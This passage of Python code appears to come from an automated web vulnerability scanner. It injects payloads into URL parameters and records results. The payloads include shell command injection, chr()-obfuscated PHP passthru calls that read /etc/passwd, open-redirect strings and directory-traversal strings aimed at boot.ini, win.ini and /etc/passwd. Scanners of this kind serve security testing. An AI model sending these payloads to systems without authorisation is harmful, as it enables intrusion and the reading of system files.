            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rce.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RCE Linux Check 2 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("$(sleep+10)")

    rce_url = new_url.replace("INJECTX", rce_exploit)
    sub_path = rce_url.split(target)[1]

    res_rce = await session.get(rce_url)
    try:

        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rce_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RCE Linux Check",
            "status": http_status,
            "url": rce_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rce.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RCE PHP Check ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("phpinfo()")

    rce_url = new_url.replace("INJECTX", rce_exploit)
    sub_path = rce_url.split(target)[1]

    res_rce = await session.get(rce_url)
    try:

        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status

        if "<title>phpinfo()</title>" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rce_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RCE PHP Check",
            "status": http_status,
            "url": rce_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rce.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RCE PHP Check 2 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote(
        "{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}"
    )

    rce_url = new_url.replace("INJECTX", rce_exploit)
    sub_path = rce_url.split(target)[1]

    res_rce = await session.get(rce_url)
    try:

        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rce_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RCE PHP Check",
            "status": http_status,
            "url": rce_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rce.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    # RCE PHP Check 3 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote(
        "{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}"
    )

    rce_url = new_url.replace("INJECTX", rce_exploit)
    sub_path = rce_url.split(target)[1]

    try:

        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status

        if "root:" in http_response:
            result_string = "vulnerable"

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")
        id = hashlib.md5((rce_url + current_time + str(random.random())).encode("utf-8")).hexdigest()
        result = {
            "id": id,
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": "RCE PHP Check",
            "status": http_status,
            "url": rce_url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {"id": id, "headers_string": json.dumps(dict(res_rce.headers))}
        result_list.append(result)
        request_list.append(request)
        response_list.append(response)

    except:
        pass

    return result_list, request_list, response_list


async def main(url, cookies="", session=None, username=None):
    # print("scanning {} ...".format(url))
    full_url = str(url)
    payload = "INJECTX"
    http_status_base = "404"
    http_length_base = "0"
    parsed = urlparse(url)
    target = "{uri.scheme}://{uri.netloc}".format(uri=parsed)
    result_list = []
    request_list = []
    response_list = []
    random.seed(datetime.now())

    async with session.get(full_url) as res:
        http_response_base = str(await res.read())
        http_length_base = len(http_response_base)
        http_status_base = res.status

        if str(http_status_base) == "404":
            print(
                COLOR1
                + "[F] Received HTTP Status 404 - Page Not Found. Skipping..."
                + RESET
            )

        elif str(http_status_base) == "403":
            print(
                COLOR1
                + "[F] Received HTTP Status 403 - Page Not Found. Skipping..."
                + RESET
            )

        else:
            if "=" in full_url:

                parsed = urllib.request.urlparse(full_url)
                params = urllib.parse.parse_qsl(parsed.query)
                param_list = []
                param_vals = []
                param_length = 0

                for x, y in params:
                    param_list.extend([str(x + "=")])
                    param_vals.extend([str(urllib.parse.quote_plus(y))])
                    param_length = param_length + 1

                # FIND BASE URL
                dynamic_url = full_url.find("?")
                base_url = str(full_url[: dynamic_url + 1])

                # LIST EACH PARAMETER
                active_fuzz = 1
                i = 1

                while i <= param_length and active_fuzz <= param_length:
                    if i < param_length and i == active_fuzz:
                        base_url += param_list[i - 1] + payload + "&"
                        i = i + 1

                    elif i == param_length and i == active_fuzz:
                        base_url += param_list[i - 1] + payload
                        active_fuzz = active_fuzz + 1
                        i = i + 1
                        results, requests, responses = await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            username,
                        )
                        result_list += results
                        request_list += requests
                        response_list += responses
                        base_url = str(full_url[: dynamic_url + 1])

                    elif i == param_length and i != active_fuzz:
                        base_url += param_list[i - 1] + param_vals[i - 1]
                        active_fuzz = active_fuzz + 1
                        i = 1
                        results, requests, responses = await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            username,
                        )
                        result_list += results
                        request_list += requests
                        response_list += responses
                        base_url = str(full_url[: dynamic_url + 1])

                    elif i == param_length:
                        base_url += param_list[i - 1] + param_vals[i - 1]
                        active_fuzz = active_fuzz + 1
                        i = 1
                        results, requests, responses = await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            username,
                        )
                        result_list += results
                        request_list += requests
                        response_list += responses
                        base_url = str(full_url[: dynamic_url + 1])

                    else:
                        base_url += param_list[i - 1] + param_vals[i - 1] + "&"
                        i = i + 1

            else:
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("//google.com")

                redirect_url = new_url.replace("INJECTX", redirect_exploit)
                sub_path = redirect_url.split(target)[1]

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "<title>Google</title>" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (redirect_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Open Redirect",
                        "status": red_res.status,
                        "url": redirect_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(red_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    pass

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/<>//google.com")

                redirect_url = new_url.replace("INJECTX", redirect_exploit)
                sub_path = redirect_url.split(target)[1]

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "<title>Google</title>" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (redirect_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Open Redirect",
                        "status": red_res.status,
                        "url": redirect_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(red_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    pass

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/%252F%252Fgoogle.com")

                redirect_url = new_url.replace("INJECTX", redirect_exploit)
                sub_path = redirect_url.split(target)[1]

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "<title>Google</title>" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (redirect_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Open Redirect",
                        "status": red_res.status,
                        "url": redirect_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(red_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    pass

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("////google.com/%2e%2e")

                redirect_url = new_url.replace("INJECTX", redirect_exploit)
                sub_path = redirect_url.split(target)[1]

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "<title>Google</title>" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (redirect_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Open Redirect",
                        "status": red_res.status,
                        "url": redirect_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(red_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    pass

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/https:/%5cgoogle.com/")

                redirect_url = new_url.replace("INJECTX", redirect_exploit)
                sub_path = redirect_url.split(target)[1]

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "<title>Google</title>" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (redirect_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Open Redirect",
                        "status": red_res.status,
                        "url": redirect_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(red_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    pass

                # Windows Directory Traversal ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini"
                )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)
                sub_path = traversal_url.split(target)[1]

                # trav_res = await session.get(traversal_url)
                try:
                    trav_res = await session.get(traversal_url)
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = trav_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "boot loader" in http_response or "16-bit" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (traversal_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Windows Directory Traversal",
                        "status": trav_res.status,
                        "url": traversal_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(trav_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except UnicodeError:
                    print("Unicode Error at {}".format(traversal_url))
                    pass

                # Windows Directory Traversal 2 ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00"
                )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)
                sub_path = traversal_url.split(target)[1]

                # trav_res = await session.get(traversal_url)
                try:
                    trav_res = await session.get(traversal_url)
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "boot loader" in http_response or "16-bit" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (traversal_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Windows Directory Traversal",
                        "status": trav_res.status,
                        "url": traversal_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(trav_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except UnicodeError:
                    print("Unicode Error at {}".format(traversal_url))
                    pass

                # Windows Directory Traversal 3 ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm"
                )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)
                sub_path = traversal_url.split(target)[1]

                # trav_res = await session.get(traversal_url)
                try:
                    trav_res = await session.get(traversal_url)
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)

                    if "boot loader" in http_response or "16-bit" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (traversal_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Windows Directory Traversal",
                        "status": trav_res.status,
                        "url": traversal_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(trav_res.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except UnicodeError:
                    print("Unicode Error at {}".format(traversal_url))
                    pass

                # Linux Directory Traversal ######################################################################################
                result_string = "benign"
                traversal_exploit = urllib.parse.quote(
                    "/../../../../../../../../../../../../../../../../../etc/passwd"
                )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)
                sub_path = traversal_url.split(target)[1]

                try:
                    http_request = urllib.request.urlopen(traversal_url)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()

                    if "root:" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (traversal_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Linux Directory Traversal",
                        "status": http_status,
                        "url": traversal_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(http_request.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    print("Unicode Error at {}".format(traversal_url))
                    pass

                new_url = full_url + "INJECTX"

                # Linux Directory Traversal 2 ######################################################################################
                result_string = "benign"
                traversal_exploit = urllib.parse.quote(
                    "/../../../../../../../../../../../../../../../../../etc/passwd%00"
                )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)
                sub_path = traversal_url.split(target)[1]

                try:
                    http_request = urllib.request.urlopen(traversal_url)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()

                    if "root:" in http_response:
                        result_string = "vulnerable"

                    now = datetime.now()
                    current_time = now.strftime("%Y-%m-%dT%H:%M")
                    id = hashlib.md5(
                        (traversal_url + current_time + str(random.random())).encode("utf-8")
                    ).hexdigest()
                    result = {
                        "id": id,
                        "timestamp": current_time,
                        "username": username,
                        "target": target,
                        "sub_path": sub_path,
                        "vulnerability": "Linux Directory Traversal",
                        "status": http_status,
                        "url": traversal_url,
                        "result_string": result_string,
                    }
                    request = {
                        "id": id,
                        "host": target,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "User-Agent": "Python/3.9 aiohttp/3.7.3",
                        "body": "",
                    }
                    response = {
                        "id": id,
                        "headers_string": json.dumps(dict(http_request.headers)),
                    }
                    result_list.append(result)
                    request_list.append(request)
                    response_list.append(response)

                except:
                    print("Unicode Error at {}".format(traversal_url))
                    pass

    await session.close()
    return result_list, request_list, response_list


# async def wrapperMain(urlList, cookies="", session=None, username=None):
#     async with ClientSession() as session:
#         global result_list_global
#         result_list_global = []
#         futures = [asyncio.ensure_future(main(url=url, session=session, username=username))
#                    for url in urlList]
#         res = await asyncio.gather(*futures)
#         return result_list_global
